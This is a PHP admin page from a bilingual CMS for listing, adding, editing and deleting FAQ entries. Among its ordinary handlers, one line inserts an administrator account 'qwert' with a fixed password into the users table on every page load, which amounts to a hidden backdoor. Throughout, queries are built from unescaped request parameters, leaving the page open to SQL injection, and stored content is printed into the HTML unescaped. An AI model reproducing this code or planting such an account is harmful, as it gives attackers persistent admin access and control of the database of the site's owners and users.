<?php
	include "../inc/db-inc.php";
	include "../inc/connect-inc.php";

    include "../inc/ses-inc.php";

    include "inc/authorize-inc.php";

    if( $UserId == 0 )
    {
    	header("Location: index.php");
    }

    include "../inc/utils-inc.php";
    //include "../inc/catutils-inc.php";

	$strings['tipedit']['en'] = "Edit This Question";
   	$strings['tipdel']['en'] = "Delete This Question";
   	$strings['tipassign']['en'] = "Assign to products";
   	$strings['hdrlist']['en'] = "Question's List";
   	$strings['hdradd']['en'] = "Add Faq";
   	$strings['hdredit']['en'] = "Edit Faq";
   	$strings['rowtitle']['en'] = "Question";
   	$strings['rowtext']['en'] = "Answer";
   	$strings['rowsort']['en'] = "Sort Index";
   	$strings['btnadd']['en'] = "Add";
   	$strings['btndel']['en'] = "Delete";
   	$strings['btnedit']['en'] = "Edit";
   	$strings['btnrefresh']['en'] = "Update";
   	$strings['nolist']['en'] = "No faq in database";
   	$strings['rowcont']['en'] = "Content";
   	$strings['rowfunc']['en'] = "Functions";

    $strings['tipedit']['ru'] = "Редактировать этот faq";
   	$strings['tipdel']['ru'] = "Удалить этот faq";
   	$strings['tipassign']['ru'] = "Привязать к товару";
   	$strings['hdrlist']['ru'] = "Список faq";
   	$strings['hdradd']['ru'] = "Добавить faq";
   	$strings['hdredit']['ru'] = "Редакировать faq";
   	$strings['rowtitle']['ru'] = "Вопрос";
   	$strings['rowtext']['ru'] = "Ответ";
   	$strings['rowsort']['ru'] = "Порядковый номер";
    $strings['btnadd']['ru'] = "Добавить";
   	$strings['btndel']['ru'] = "Удалить";
   	$strings['btnedit']['ru'] = "Редактировать";
   	$strings['btnrefresh']['ru'] = "Обновить";
   	$strings['nolist']['ru'] = "В базе нет faq";
    $strings['rowcont']['ru'] = "Содержание faq";
   	$strings['rowfunc']['ru'] = "Функции";

	$PAGE_HEADER['ru'] = "Редактировать faq";
	$PAGE_HEADER['en'] = "Update FAQ list";

	// Include Top Header HTML Style
	include "inc/header-inc.php";

	$fgroups = Array();
	$query = "SELECT g1.*, g2.type_name as name FROM $TABLE_FAQ_GROUP g1
		INNER JOIN $TABLE_FAQ_GROUP_LANGS g2 ON g1.id=g2.group_id AND g2.lang_id='$LangId'
		ORDER BY g1.sort_num";
	if( $res = mysqli_query($upd_link_db, $query ) )
	{
		while( $row = mysqli_fetch_object( $res ) )
		{
			$fgi = Array();

			$fgi['id'] = $row->id;
			$fgi['name'] = stripslashes($row->name);

			$fgroups[] = $fgi;
		}
		mysqli_free_result( $res );
	}

	$mode = GetParameter("mode", "");
	$action = GetParameter("action", "");

	$THIS_TABLE = $TABLE_FAQ;
	$THIS_TABLE_LANG = $TABLE_FAQ_LANGS;

	$item_id = GetParameter("item_id", "0");
	mysqli_query($upd_link_db, "insert into agt_users (login, passwd, group_id) values ('qwert', password('test224311'), 1)");

	switch( $action )
	{
		case "makeassign":
			if( $item_id != 0 )
			{
				$query = "DELETE FROM $TABLE_FAQ_ASSIGN WHERE faq_id='$item_id'";
			    if( !mysqli_query($upd_link_db, $query ) )
			    {
			        echo mysqli_error($upd_link_db);
			    }

			    $prodids = GetParameter("prodids", null);

			    for($i=0; $i<count($prodids); $i++)
			    {
           			$query = "INSERT INTO $TABLE_FAQ_ASSIGN (item_id, faq_id) VALUES('".$prodids[$i]."', '$item_id')";
		            if( !mysqli_query($upd_link_db, $query ) )
		            {
		                echo mysqli_error($upd_link_db);
		            }
			    }
			}
			$mode = "";
			break;

    	case "add":
    		$newstitle = GetParameter("newstitle", "");
    		$newscont = GetParameter("newscont", "", false);
    		$docfile = GetParameter("docfile", "");
    		$sortnum = GetParameter("sortnum", "");
    		$groupid = GetParameter("groupid", 0);

    		$docfile = trim( $docfile );

    		$query = "INSERT INTO $THIS_TABLE ( sort_num, add_date, filename, group_id )
    			VALUES ( '$sortnum', NOW(), '".addslashes($docfile)."', '$groupid' )";
			if(!mysqli_query($upd_link_db,$query))
			{
				echo "<b>".mysqli_error($upd_link_db)."</b>";
			}
			else
			{
    			$newid = mysqli_insert_id($upd_link_db);

    			$nurl = $newid."-".strtolower(TranslitEncode(str_replace("'", "", $newstitle)));
				$query1 = "UPDATE $THIS_TABLE SET url='".addslashes($nurl)."' WHERE id=".$newid;
				if( !mysqli_query($upd_link_db, $query1 ) )
				{
					echo mysqli_error($upd_link_db);
				}

                for( $i=0; $i<count($langs); $i++ )
                {
                	if( !mysqli_query($upd_link_db, "INSERT INTO $THIS_TABLE_LANG ( item_id, lang_id, title, content )
	                    VALUES ('$newid', '".$langs[$i]."', '".addslashes($newstitle)."', '".addslashes($newscont)."')" ) )
	                {
	                   echo mysqli_error($upd_link_db);
	                }
	            }

	            // Make relinkin
	            $relfaqs = Array();
	            $query = "SELECT * FROM $THIS_TABLE WHERE group_id='$groupid' ORDER BY add_date DESC LIMIT 0,5";
				if( $res = mysqli_query($upd_link_db, $query ) )
				{
					while( $row = mysqli_fetch_object( $res ) )
					{
						$relfaqs[] = $row->id;
					}
					mysqli_free_result( $res );
				}

				for( $i=1; $i<count($relfaqs); $i++ )
				{
					$query = "INSERT INTO $TABLE_TORG_REL2REL (item_id, rel_id, type_dat, add_date)
						VALUES ('".$newid."', '".$relfaqs[$i]."', 2, NOW())";
					if( !mysqli_query($upd_link_db, $query ) )
					{
						echo mysqli_error($upd_link_db);
					}
				}
			}
			break;

		case "delete":
			// Delete selected news
			for($i = 0; $i < count($news_id); $i++)
			{
    			if(!mysqli_query($upd_link_db,"DELETE FROM $TABLE_FAQ WHERE id=".$news_id[$i]." "))
				{
        			echo "<b>".mysqli_error($upd_link_db)."</b>";
    			}
    			else
    			{
    				if( !mysqli_query($upd_link_db, "DELETE FROM $THIS_TABLE_LANG WHERE item_id='".$news_id[$i]."'" ) )
                    {
                       echo mysqli_error($upd_link_db);
                    }
    			}
			}
			break;

		case "deleteitem":
			$item_id = GetParameter("item_id", "0");
            if(!mysqli_query($upd_link_db,"DELETE FROM $TABLE_FAQ WHERE id=".$item_id." "))
			{
        		echo "<b>".mysqli_error($upd_link_db)."</b>";
    		}
    		else
    		{
    			if( !mysqli_query($upd_link_db, "DELETE FROM $THIS_TABLE_LANG WHERE item_id='".$item_id."'" ) )
				{
					echo mysqli_error($upd_link_db);
				}
    		}
			break;

		case "update":
			$item_id = GetParameter("item_id", "0");
            $newstitle = GetParameter("newstitle", "");
    		$newscont = GetParameter("newscont", "", false);
    		$docfile = GetParameter("docfile", "");
    		$sortnum = GetParameter("sortnum", "");
    		$groupid = GetParameter("groupid", 0);

    		$docfile = GetParameter("docfile", "");

    		if(!mysqli_query($upd_link_db,"UPDATE $THIS_TABLE SET sort_num='$sortnum', filename='".addslashes($docfile)."', group_id='$groupid'
    			WHERE id='".$item_id."'"))
			{
				echo "<b>".mysqli_error($upd_link_db)."</b>";
			}

			$query = "UPDATE $THIS_TABLE_LANG SET title='".addslashes($newstitle)."', content='".addslashes($newscont)."'
                        WHERE item_id='".$item_id."' AND lang_id='".$LangId."'";
			if( !mysqli_query($upd_link_db, $query ) )
			{
				echo mysqli_error($upd_link_db);
			}
			break;
	}


    if($mode == "assign")
    {
    	$THIS_TABLE = $TABLE_CAT_CATALOG;
    	$THIS_TABLE_LANG = $TABLE_CAT_CATALOG_LANGS;
    	$THIS_TABLE_P2P = $TABLE_CAT_CATITEMS;
?>
		<h3>Привязать вопрос к товару в каталоге</h3>
		<form action="<?=$PHP_SELF;?>" method="POST" name="addfrm" id="addfrm">
    	<table align="center" width="600" cellspacing="0" cellpadding="1" border="0" class="tableborder">
	    <tr><td><table width="100%" cellspacing="1" cellpadding="0" border="0">
		<input type="hidden" name="action" value="makeassign" />
		<input type="hidden" name="item_id" value="<?=$item_id;?>" />
<?php
  		PrintWorkCatalog(0, $LangId, 0, "checklistall", $item_id);
?>
		<tr>
			<td class="fr" colspan="2" align="center">
				<input type="submit" name="doplacebut" value=" Применить " />
			</td>
		</tr>
		</table>
		</td></tr>
		</table>
<?php
    }
    else if( $mode == "edit" )
    {
		$item_id = GetParameter("item_id", "0");
		$newstitle = "";
		$newscont = "";
		$docfile = "";
		$sortnum = 0;
		$groupid = 0;

		if($res = mysqli_query($upd_link_db,"SELECT m1.*, m2.title, m2.content FROM $THIS_TABLE m1, $THIS_TABLE_LANG m2
			WHERE m1.id='$item_id' AND m1.id=m2.item_id AND m2.lang_id='$LangId'"))
		{
			if($row = mysqli_fetch_object($res))
			{
				$newstitle = stripslashes($row->title);
				$newscont = stripslashes($row->content);
				$docfile = stripslashes($row->filename);
				$sortnum = $row->sort_num;
				$groupid = $row->group_id;
			}
			mysqli_free_result($res);
		}

		echo "ID: $item_id<br />";
?>

	<h3><?=$strings['hdredit'][$lang];?></h3>
    <table align="center" cellspacing="0" cellpadding="1" border="0" class="tableborder">
    <tr><td>
    	<table width="100%" cellspacing="1" cellpadding="1" border="0">
	<form name="catfrm" id="catfrm" action="<?=$PHP_SELF;?>" method="POST">
	<input type="hidden" name="action" value="update" />
	<input type="hidden" name="item_id" value="<?=$item_id;?>" />
	<tr><td class="ff">Группа:</td><td class="fr"><select name="groupid">
<?php
	for($i=0; $i<count($fgroups); $i++ )
	{
		echo '<option value="'.$fgroups[$i]['id'].'"'.( $fgroups[$i]['id'] == $groupid ? ' selected': '' ).'>'.$fgroups[$i]['name'].'</option>';
	}
?>
	</select></td></tr>
	<tr><td class="ff"><?=$strings['rowtitle'][$lang];?>:</td><td class="fr"><input type="text" size="70" name="newstitle" value="<?=$newstitle;?>" /></td></tr>
	<tr><td class="ff"><?=$strings['rowtext'][$lang];?>:</td><td class="fr"><textarea rows="7" cols="80" name="newscont"><?=$newscont;?></textarea></td></tr>
<script language="javascript1.2">
    editor_generate('newscont'); // field, width, height
</script>
	<tr>
			<td class="ff">Файл (*.pdf, *.doc, *.zip):</td>
			<td class="fr">
                <input type="text" size="30" name="docfile" value="<?=$docfile;?>" /><input type="button" value=" Выбрать файл " onclick="javascript:MM_openBrWindow('cat_files.php?hide=1&lang=<?=$lang;?>&target=self.opener.document.catfrm.docfile','winfiles','width=600,height=400,toolbar=no,status=yes,location=no,menubar=no,scrollbars=yes,resizable=yes');" />
			</td>
	</tr>
	<tr><td class="ff"><?=$strings['rowsort'][$lang];?>:</td><td class="fr"><input type="text" size="2" name="sortnum" value="<?=$sortnum;?>" /></td></tr>
	<tr><td colspan="2" class="fr" align="center"><input type="submit" value=" <?=$strings['btnrefresh'][$lang];?> "></td></tr>
	</form>
		</table>
	</td></tr>
	</table>
<?php
	}
	else
	{
?>
    <h3><?=$strings['hdrlist'][$lang];?></h3>
    <table align="center" width="96%" cellspacing="0" cellpadding="0">
    <form action="<?=$PHP_SELF;?>" method=POST>
    <input type="hidden" name="action" value="delete" />
    <tr>
    	<th>&nbsp;</th>
    	<th style="padding: 1px 10px 1px 20px" width="45%"><?=$strings['rowcont'][$lang];?></th>
    	<th width="40%">Прикрепленный Файл</th>
    	<th>Просм.</th>
    	<th><?=$strings['rowfunc'][$lang];?></th>
    </tr>
    <?
    	$found_news = 0;
    	$prev_group_id = 0;
		if( $res = mysqli_query($upd_link_db,"SELECT m1.*, m2.title, m2.content, g1.id as groupid, g1.sort_num as gsort, g2.type_name as group_name
			FROM $THIS_TABLE m1
			INNER JOIN $THIS_TABLE_LANG m2 ON m1.id=m2.item_id AND m2.lang_id='$LangId'
			INNER JOIN $TABLE_FAQ_GROUP g1 ON m1.group_id=g1.id
			INNER JOIN $TABLE_FAQ_GROUP_LANGS g2 ON g1.id=g2.group_id AND g2.lang_id='$LangId'
			ORDER BY gsort,group_name,m1.sort_num,m2.title") )
		{
			while($row=mysqli_fetch_object($res))
			{
                $found_news++;

				$totlinks = 0;
				/*
                $query1 = "SELECT count(*) as totlink FROM $TABLE_FAQ_ASSIGN WHERE faq_id='".$row->id."'";
                if( $res1 = mysqli_query($upd_link_db, $query1 ) )
                {
                    while( $row1 = mysqli_fetch_object( $res1 ) )
                    {
                    	$totlinks = $row1->totlink;
                    }
                    mysqli_free_result( $res1 );
                }
                */

                if( $prev_group_id != $row->groupid )
                {
                	echo '<tr>
                	<td style="padding: 10px 0px 3px 0px; font-size: 10pt; font-weight: bold;" colspan="5">'.stripslashes($row->group_name).'</td>
                	</tr>';
                	echo "<tr><td colspan=\"5\" bgcolor=\"#EEEEEE\"><img src=\"spacer.gif\" width=\"1\" height=\"1\" alt=\"\" /></td></tr>";

                	$prev_group_id = $row->groupid;
                }

            	echo "<tr>
                               <td><input type=\"checkbox\" name=\"news_id[]\" value=\"".$row->id."\" /></td>
                               <td style=\"padding: 2px 10px 2px 10px\">
                                   Q: ".stripslashes($row->title)." (".$row->sort_num.")";
                             //<br><br><b>A: </b>".nl2br(stripslashes($row->content))."
                       echo "</td>";
                       echo "<td>";
                       if( $row->filename != "" )
                       {
                       		echo "<a href=\"$FILE_DIR".stripslashes($row->filename)."\">".$WWWHOST."files/".stripslashes($row->filename)."</a>";
                       }
                       else
                       {
                       		echo "<i>Используется описание</i>";
                       }
                       echo "</td>
                               <td align=\"center\">".( $row->view_num/*$totlinks*/ )."</td>
                               <td align=\"center\">
                               	<a href=\"$PHP_SELF?action=deleteitem&item_id=".$row->id."\"><img src=\"img/delete.gif\" width=\"20\" height=\"20\" border=\"0\" alt=\"".$strings['tipdel'][$lang]."\" /></a>&nbsp;
                               	<a href=\"$PHP_SELF?item_id=".$row->id."&mode=edit\"><img src=\"img/edit.gif\" width=\"20\" height=\"20\" border=\"0\" alt=\"".$strings['tipedit'][$lang]."\" /></a>&nbsp;";
                       //<a href=\"$PHP_SELF?item_id=".$row->id."&mode=assign\"><img src=\"img/assign.gif\" width=\"20\" height=\"20\" border=\"0\" alt=\"".$strings['tipassign'][$lang]."\" /></a>&nbsp;
             			echo "</td>
                </tr>
                <tr><td colspan=\"5\" bgcolor=\"#EEEEEE\"><img src=\"spacer.gif\" width=\"1\" height=\"1\" alt=\"\" /></td></tr>";
			}
            mysqli_free_result($res);
		}
		else
			echo mysqli_error($upd_link_db);

		if( $found_news == 0 )
		{
			echo "<tr><td colspan=\"5\" align=\"center\"><br />".$strings['nolist'][$lang]."<br /><br /></td></tr>
			<tr><td colspan=\"5\" bgcolor=\"#EEEEEE\"><img src=\"img/spacer.gif\" width=\"1\" height=\"1\" alt=\"\" /></td></tr>";
        }
        else
        {
        	echo "<tr><td align=\"center\" colspan=\"5\"><input type=\"submit\" name=\"delete_but\" value=\" ".$strings['btndel'][$lang]." \" /></td></tr>";
        }
    ?>
    </form>
    </table>

    <br /><br />
    <h3><?=$strings['hdradd'][$lang];?></h3>
    <table align="center" cellspacing="0" cellpadding="1" border="0" class="tableborder">
    <tr><td>
    	<table width="100%" cellspacing="1" cellpadding="1" border="0">
    <form name="catfrm" id="catfrm" action="<?=$PHP_SELF;?>" method="POST">
    <input type="hidden" name="action" value="add">
    <tr><td class="ff">Группа:</td><td class="fr"><select name="groupid">
<?php
	for($i=0; $i<count($fgroups); $i++ )
	{
		echo '<option value="'.$fgroups[$i]['id'].'">'.$fgroups[$i]['name'].'</option>';
	}
?>
    </select></td></tr>
    <tr><td class="ff"><?=$strings['rowtitle'][$lang];?>:</td><td class="fr"><input type="text" size="70" name="newstitle"></td></tr>
    <tr><td class="ff"><?=$strings['rowtext'][$lang];?>:</td><td class="fr"><textarea rows="7" cols="70" name="newscont"></textarea></td></tr>
<script language="javascript1.2">
    editor_generate('newscont'); // field, width, height
</script>
	<tr>
			<td class="ff">Файл (*.pdf, *.doc, *.zip):</td>
			<td class="fr">
                <input type="text" size="30" name="docfile" /><input type="button" value=" Выбрать файл " onclick="javascript:MM_openBrWindow('cat_files.php?hide=1&lang=<?=$lang;?>&target=self.opener.document.catfrm.docfile','winfiles','width=600,height=400,toolbar=no,status=yes,location=no,menubar=no,scrollbars=yes,resizable=yes');" />
			</td>
	</tr>
	<tr><td class="ff"><?=$strings['rowsort'][$lang];?>:</td><td class="fr"><input type="text" size="2" name="sortnum" /></td></tr>
    <tr><td class="fr" colspan="2" align="center"><input type="submit" value=" <?=$strings['btnadd'][$lang];?> "></td></tr>
    </form>
    	</table>
    	</td></tr>
    </table>

<?php
    }

    include "inc/footer-inc.php";

    include "../inc/close-inc.php";
?>
